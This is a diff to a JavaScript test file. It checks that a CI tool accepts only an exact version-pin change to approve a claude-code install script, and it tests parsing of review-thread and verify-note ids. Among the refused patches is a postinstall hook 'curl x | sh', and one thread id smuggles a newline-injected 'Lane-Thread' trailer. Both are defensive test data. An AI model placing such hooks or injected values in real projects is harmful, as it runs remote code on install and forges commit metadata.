@@ -777,6 +777,47 @@ test("the dependency-version-change rule refuses a lock repointed at another pac
   }
 });
 
+// --- the install-script-pin row: review-dependency select's pin patch, no verdict ---
+
+const CLI = "@anthropic-ai/claude-code";
+const PIN_PKG = (pin, extra = {}) => `${JSON.stringify({ name: "p", devDependencies: { [CLI]: "2.1.317" }, allowScripts: { [`${CLI}@${pin}`]: true, "e@1.0.0": true }, ...extra }, null, 2)}\n`;
+function pinPatch(t, edit) {
+  return repoWithPatch(t, (repo) => edit(repo), {
+    head: (repo) => {
+      writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.316"));
+      writeFileSync(join(repo, "package-lock.json"), LOCK("1.0.0"));
+    },
+  });
+}
+const pinPush = (fix, api) => pushWith(fix, api, { row: row("install-script-pin"), context: { dependencyVerdict: "", dependabotConfig: PAIRS } });
+
+test("the install-script-pin row pushes the pin moved to the manifest's version with no verdict", async (t) => {
+  const fix = pinPatch(t, (repo) => writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.317")));
+  const api = fakeApi(fix.repo, fix.head);
+  assert.equal((await pinPush(fix, api)).outcome, "pushed");
+  const { createCommit } = api.calls.find((call) => call.createCommit);
+  assert.equal(createCommit.message, "Approve the locked claude-code install script on feat/x [dependabot skip]\n\nLane-Activity: some-lane/some-activity\n");
+});
+
+test("the install-script-pin row refuses any other change before any API call", async (t) => {
+  for (const [why, edit, reason = "dependency-pin-protected-path"] of [
+    ["a pin to another version", (repo) => writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.318"))],
+    ["a name-only approval", (repo) => writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.317").replace(`"${CLI}@2.1.317"`, `"${CLI}"`))],
+    ["the pin and a script", (repo) => writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.317", { scripts: { postinstall: "curl x | sh" } }))],
+    // Past max-files 1: refused as invalid.
+    ["the pin and the lock", (repo) => {
+      writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.317"));
+      writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0"));
+    }, "dependency-pin-invalid"],
+    ["the lock alone", (repo) => writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0"))],
+  ]) {
+    const fix = pinPatch(t, edit);
+    const api = fakeApi(fix.repo, fix.head);
+    assert.deepEqual(await pinPush(fix, api), { outcome: "escalate", escalationReason: reason }, why);
+    assert.deepEqual(api.calls, [], why);
+  }
+});
+
 test("checkRow names an unknown content rule", () => {
   assert.throws(() => checkRow(row("dependency-review", { "content-rule": "anything" })), /unknown content rule: anything/);
   assert.equal(RULES["dependency-review"]["content-rule"], "dependency-version-change");
@@ -1097,6 +1138,24 @@ test("keptThreadsFrom keeps each thread id of the select job's shape, in the fil
   const file = join(scratch(t), "threads.json");
   writeFileSync(file, JSON.stringify({ threads: [{ id: "PRRT_2", path: "a" }, { id: "PRRT_1", path: "b" }, { id: "PRRT_x\nLane-Thread: PRRT_y", path: "c" }, { path: "d" }] }));
   assert.deepEqual(keptThreadsFrom(file).ids, ["PRRT_2", "PRRT_1"]);
+});
+
+// #12809: an earlier-fail round keeps no thread, only the FAIL's notes, each a
+// path and a VNOTE_ id: the fix's scope and its Lane-Thread trailer take them
+// as threads.
+test("keptThreadsFrom takes an earlier FAIL's notes as threads on their paths, by note id", (t) => {
+  const file = join(scratch(t), "threads.json");
+  writeFileSync(file, JSON.stringify({ threads: [], verify_notes: [{ id: "VNOTE_1", head: "b".repeat(40), path: "src/a.js", body: "x" }, { id: "VNOTE_2", head: "b".repeat(40), path: "docs/b.md", body: "y" }], pr_paths: ["src/a.js"] }));
+  const kept = keptThreadsFrom(file);
+  assert.deepEqual(kept.paths, new Set(["src/a.js", "docs/b.md"]));
+  assert.deepEqual(kept.ids, ["VNOTE_1", "VNOTE_2"]);
+  const replies = join(scratch(t), "replies.jsonl");
+  writeFileSync(replies, [replyLine("VNOTE_2", "VALID"), replyLine("VNOTE_1", "already-addressed")].join("\n"));
+  assert.deepEqual(fixedThreadsFrom(replies, kept), ["VNOTE_2"]);
+  for (const notes of [[{ id: "VNOTE_0", path: "a" }], [{ id: "PRRT_1", path: "a" }], [{ id: "VNOTE_1" }], "VNOTE_1"]) {
+    writeFileSync(file, JSON.stringify({ threads: [], verify_notes: notes }));
+    assert.throws(() => keptThreadsFrom(file), /KEPT_THREADS_FILE/, JSON.stringify(notes));
+  }
 });
 
 // replies.jsonl as the model job's scan job uploads it, one reply per line.
